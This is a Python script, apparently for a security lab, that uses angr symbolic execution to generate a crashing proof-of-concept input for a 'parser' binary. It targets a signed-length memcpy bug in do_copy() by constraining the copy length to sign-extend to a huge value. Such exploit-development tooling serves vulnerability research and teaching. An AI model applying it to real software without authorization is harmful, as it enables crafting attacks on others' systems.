#!/usr/bin/env python3
"""Synthesize an input for `parser` that reaches do_copy().

Usage:  find_crash.py [BINARY]      (default: ./parser-x86_64)
Writes the concrete POC bytes to stdout, a hex summary to stderr.
"""
import angr, claripy, sys

BIN = sys.argv[1] if len(sys.argv) > 1 else './parser-x86_64'

p = angr.Project(BIN, auto_load_libs=False)
INBUF = 64
inp = claripy.BVS('inp', INBUF * 8)                       # ❶
state = p.factory.entry_state(
    stdin=angr.SimFileStream(name='stdin', content=inp, has_end=True))

# The buggy memcpy sits at this address in the lab binary; check with
# nm parser | grep do_copy   (an offset works if the binary is stripped).
crash_addr = p.loader.find_symbol('do_copy').rebased_addr

simgr = p.factory.simgr(state, save_unconstrained=True)   # ❷
simgr.explore(find=crash_addr)

if simgr.found:
    found = simgr.found[0]
    # Reaching do_copy is NOT sufficient: the length gate in main() is a
    # SIGNED comparison (`len >= 32` rejects), so it admits both the small
    # non-negative lengths (0..31, a harmless copy -> rc 0) and the negative
    # lengths that are the actual bug.  Left unconstrained, the solver is free
    # to hand back a len=0 input, which runs cleanly -- the source of the
    # historic flakiness.  Pin down the *crashing* condition symbolically:
    # at do_copy's entry the size_t argument `n` is in rdx (SysV AMD64), and
    # n == (size_t)(int32_t)len, so a negative len sign-extends to n >= 2**63.
    # Requiring that forces angr to synthesize an input whose copy length is
    # enormous -- i.e. one that genuinely segfaults -- deterministically.
    n = found.regs.rdx
    found.add_constraints(n.UGE(0x8000000000000000))      # ❸ select the real bug
    assert found.satisfiable(), 'crashing length is unsatisfiable at do_copy'
    poc = found.solver.eval(inp, cast_to=bytes)
    sys.stdout.buffer.write(poc)                          # ❹ real bytes, ready to feed
    print(f'\n[+] poc {len(poc)} bytes: {poc.hex()}', file=sys.stderr)
else:
    sys.exit('no state reached do_copy')
